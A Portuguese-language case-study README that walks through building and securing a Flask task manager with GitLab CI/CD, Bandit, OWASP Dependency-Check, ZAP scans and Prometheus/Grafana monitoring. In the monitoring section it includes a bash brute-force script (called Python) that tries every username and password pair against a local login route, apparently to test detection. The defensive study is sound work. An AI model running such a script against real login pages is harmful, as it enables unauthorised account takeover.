## INTRODUÇÃO

Este estudo de caso se refere a implementação e segurança de um sistema de gerenciamento de tarefas pessoais, integrando processos de SDLC, DevOps e DevSecOps para garantir eficiência e segurança.
<hr>


### ETAPA 1: PLANEJAMENTO E DEFINIÇÃO DE REQUISITOS

1. Clonar o projeto e instalar das dependências a partir do requiriments.txt:

```
Flask==2.3.2
Flask-Bcrypt==1.0.1
Flask-Login==0.6.3
Flask-SQLAlchemy==3.0.5
Flask-WTF==1.1.1
WTForms==3.1.1
Jinja2==3.1.2
werkzeug==2.3.3
coverage
python-dotenv
prometheus-flask-exporter
```
<br />
   
2. Construir o Diagrama para entender o dominio do problema:

![DFD](https://github.com/gustavogss/task-manager/blob/main/images/dfd.png)
<hr>

### ETAPA 2: DESENVOLVIMENTO DO SISTEMA

***Branchs***: 
- master: produção
- development: desenvolvimento
- staging: homologação


***Ferramentas Utilizadas***: 
- Visual Studio Code
- Gitlab
- Docker
- Python
- Pytest
- Unittest
- Zed Attack Proxy
- Bandit
- OWASP Dependency-Check
- OWASP ZAP
- Hydra 
- Prometheus
- Grafana
  
<br />

1. Implementação do Dockerfile

![dockerfile](https://github.com/gustavogss/task-manager/blob/main/images/dockerfile.png)
<br />


2. Aplicação executada:

![app](https://github.com/gustavogss/task-manager/blob/main/images/app.png)
<hr>


### ETAPA3: IMPLEMENTAÇÃO DE UM PIPELINE CI/CD

1. Implementação do build e deploy na pipeline

![gitlab](https://github.com/gustavogss/task-manager/blob/main/images/gitlabci.png)
<br />

2. Pipeline em execução no gitlab:

![pipeline-inital](https://github.com/gustavogss/task-manager/blob/main/images/pipeline-initial.png)

<hr>


### ETAPA 4: ANÁLISE ESTÁTICA DE CÓDIGO (SAST)

1. Implementação do Bandit na pipeline:

![bandit](https://github.com/gustavogss/task-manager/blob/main/images/bandit.png)
<br />

2. Artefato gerado mostrando dados sensíveis expostos na aplicação:

![artfect-bandit](https://github.com/gustavogss/task-manager/blob/main/images/bandit-artifect.png)
<br />

3. Correção no código da falha capturada pelo Bandit:

![fix-bandit](https://github.com/gustavogss/task-manager/blob/main/images/fixenv.png)

<br />
   
4. Implementação do OWASP Dependency Check na pipeline:

![owasp-dependency-check](https://github.com/gustavogss/task-manager/blob/main/images/owasp-dependecy-check.png)
<br />

5. Artefato gerado com vulnerabilidades no código javascript:

![artfect-dependency](https://github.com/gustavogss/task-manager/blob/main/images/artifect-dependency-check.png)
<hr>

### ETAPA 5: ANÁLISE DINÂMICA DE SEGURANÇA  (DAST)

1. Foi utilizada a aplicação Zed Attack Proxy (ZAP) para fazer uma varredura rápida na aplicação:

 ![zed](https://github.com/gustavogss/task-manager/blob/main/images/zap-attack-tools.png)
  <br />
  
2. Artefato gerado mostrando as vulnerabilidades e níveis de risco:

![artefact-zed](https://github.com/gustavogss/task-manager/blob/main/images/artefact-zap-attack-tools.png)
<hr>

### ETAPA 6: ENTREGA CONTÍNUA (CD)

1. Implementação da etapa revisão de código na pipeline:

![review](https://github.com/gustavogss/task-manager/blob/main/images/review-pipeline.png)
<br />
   
2. Implementação do OWASP ZAP para executar em toda pipeline na homologação: 

![owasp-zap](https://github.com/gustavogss/task-manager/blob/main/images/dast.png)
<hr>


### ETAPA 7: MONITORAMENTO

1. Implementação do Prometheus e Grafana na produção:

![prometehues-grafana](https://github.com/gustavogss/task-manager/blob/main/images/grafana-prometheus.png)
<br />
   
2. Implementação do ataque de bruta force em python:

```
#!/bin/bash

URL="http://localhost:5000/login"   
USERNAMES="usernames.txt"        
PASSWORDS="passwords.txt"       

if [[ ! -f "$USERNAMES" || ! -f "$PASSWORDS" ]]; then
  echo "Os arquivos usernames.txt ou passwords.txt não foram encontrados."
  exit 1
fi

while IFS= read -r username; do
  while IFS= read -r password; do
    echo "Tentando login com Username: $username e Password: $password"    
 
    response=$(curl -s -X POST -d "username=$username&password=$password" "$URL")    
   
    if [[ $response == *"Login successful"* ]]; then
      echo "SUCESSO! Username: $username | Password: $password"
      exit 0
    fi
  done < "$PASSWORDS"
done < "$USERNAMES"
```
<br />
   
3. Acompanhamento pelo Grafana com o ataque de bruta force em execução na rota de login:

![monitory](https://github.com/gustavogss/task-manager/blob/main/images/monitory.png)
<hr>

### ETAPA 8: FEEDBACKS

1. A aplicação é antiga e precisou que algumas bibliotecas fossem atualizadas;
   
2. Foi corrigida uma das vulnerabilidades críticas capturada pelo bandit;
   
3. Testes funcionais e de integração foram implementados na etapa de homologação 
   
4. A pipeline foi testada de ponta a ponta, do desenvolvimento a homologação e produção:

![pipeline-full](https://github.com/gustavogss/task-manager/blob/main/images/pipeline-finished.png)

<br />
